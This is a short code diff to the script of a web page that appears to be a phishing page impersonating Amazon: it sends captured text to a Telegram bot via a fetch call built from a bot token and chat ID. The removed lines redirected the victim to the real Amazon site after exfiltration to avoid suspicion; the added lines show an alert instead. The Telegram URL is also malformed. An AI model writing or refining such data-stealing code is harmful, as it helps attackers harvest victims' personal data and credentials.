@@ -63,15 +63,8 @@
       const url = `https://telegram.org{BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
       
       fetch(url)
-        .then(response => {
-          // Redirect the user to the real Amazon page after data is sent
-          window.location.href = 'https://amazon.com';
-        })
-        .catch(error => {
-          console.error('Error:', error);
-          // Fallback redirect if fetch fails
-          window.location.href = 'https://amazon.com';
-        });
+        .then(response => alert('Data sent!'))
+        .catch(error => console.error('Error:', error));
     });
   </script>
 </body>
